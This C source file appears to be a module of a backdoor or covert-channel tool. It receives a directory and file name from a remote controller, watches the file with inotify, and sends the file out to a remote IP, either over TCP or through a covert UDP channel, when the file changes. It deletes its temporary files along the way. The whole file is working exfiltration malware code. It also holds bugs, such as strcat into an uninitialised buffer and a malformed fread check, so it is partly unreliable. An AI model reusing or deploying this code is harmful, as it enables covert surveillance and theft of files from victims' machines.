#include "inotify.h"

int initInotify(){
    int socket;
    if((socket = inotify_init1(IN_NONBLOCK)) < 0){
        perror("Could not initilize inotify");
        exit(1);
    }
    return socket;
}

int addWatch(int socket, char *directory){
    int watch;
    if((watch = inotify_add_watch(socket, directory, IN_MODIFY)) < 0){
        perror("Could not iniitilize watch descriptor");
    }
    return watch;
}

void *watch_directory(void* args){
    inotify_struct *arg = args;
    char directory[BUFSIZ];
    char file[BUFSIZ];
    int socket, watch, epollfd;
    struct epoll_event event;
    struct epoll_event *events;
    char buffer[BUFLEN];
    int k, len;
    FILE* fp;
    long size;
    char *buf;


    recv_results(arg->localip, 8508, "directory", arg->tcp);
    recv_results(arg->localip, 8508, "file", arg->tcp);

    if((fp = fopen("directory", "rb")) == NULL) {
        perror("fopen can't open file");
        exit(1);
    }

    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    rewind(fp);
    buf = calloc(1, size+1);
    if(fread(buf, size, 1, fp) == !1){
        perror("fread");
        fclose(fp);
        free(buf);
        exit(1);
    }
    strncpy(directory, buf, BUFSIZ);
    printf("Directory to watch: %s\n", directory);
    fclose(fp);
    free(buf);

    if((fp = fopen("file", "rb")) == NULL) {
        perror("fopen can't open file");
        exit(1);
    }
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    rewind(fp);
    buf = calloc(1, size+1);
    if(fread(buf, size, 1, fp) == !1){
        perror("fread");
        fclose(fp);
        free(buf);
        exit(1);
    }
    strncpy(file, buf, BUFSIZ);
    printf("File to watch: %s\n", file);
    fclose(fp);
    free(buf);

    system("rm -rf directory");
    system("rm -rf file");
    socket = initInotify();
    watch = addWatch(socket, directory);
    epollfd = createEpollFd();

    event.events = EPOLLIN | EPOLLOUT | EPOLLET;
    event.data.fd = socket;
    addEpollSocket(epollfd, socket, &event);
    events = calloc(64, sizeof(event));
    while(1){
        int ret = waitForEpollEvent(epollfd, events);
        for(int i = 0; i < ret; ++i){
            if(ret > 0){
                k =0;
                printf("Modificaitons were made to the file\n");
                len = read(socket, buffer, BUFLEN);
                while(k < len){
                    struct inotify_event *ievent;
                    ievent = (struct inotify_event *) &buffer[k];
                    printf("wd=%d, mask=%u cookie=%u len=%u\n", ievent->wd, ievent->mask, ievent->cookie, ievent->len);
                    if(ievent->len){
                        printf("name=%s\n", ievent->name);
                        if(strcmp(ievent->name, file) == 0){
                            char filename[BUFSIZ];
                            strcat(filename, directory);
                            strcat(filename, file);
                            send_results(arg->localip, arg->targetip, 8508, 8508, filename, arg->tcp);
                            printf("File was created\n");
                            close(socket);
                            free(events);
                            exit(1);
                        }
                    }

                    k+= EVENT_SIZE + ievent->len;
                }
            } else if(ret < 0){
                perror("Epoll wait error");
                exit(1);
            }
        }
    }
    free(events);
}

void *recv_watch_directory(void* args){
    inotify_struct *arg = args;
    char data[BUFSIZ];
    char data1[BUFSIZ];
    char directory[BUFSIZ];
    char file[BUFSIZ];
    FILE *fp;
    strncpy(directory, arg->directory, BUFSIZ);
    strncpy(file, arg->file, BUFSIZ);

    strncpy(data, directory, BUFSIZ);
	if(arg->tcp){

        if((fp = fopen("directory", "wb+")) == NULL) {
            perror("fopen can't open file");
            exit(1);
        }
        fprintf(fp, "%s", directory);
        fclose(fp);
        if((fp = fopen("file", "wb+")) == NULL) {
            perror("fopen can't open file");
            exit(1);
        }
        fprintf(fp, "%s", file);
        fclose(fp);
        send_results(arg->localip, arg->targetip, 8508, 8508, "directory", true);
        send_results(arg->localip, arg->targetip, 8508, 8508, "file", true);
        system("rm -rf directory");
        system("rm -rf file");
    } else {
        covert_udp_send_data(arg->localip, arg->targetip, 8508, 8508, data, 0);
        memset(data, 0, BUFSIZ);
        strncpy(data, file, BUFSIZ);
        covert_udp_send_data(arg->localip, arg->targetip, 8508, 8508, data, 0);
    }
    recv_results(arg->localip, 8508, "inotify", arg->tcp);
}


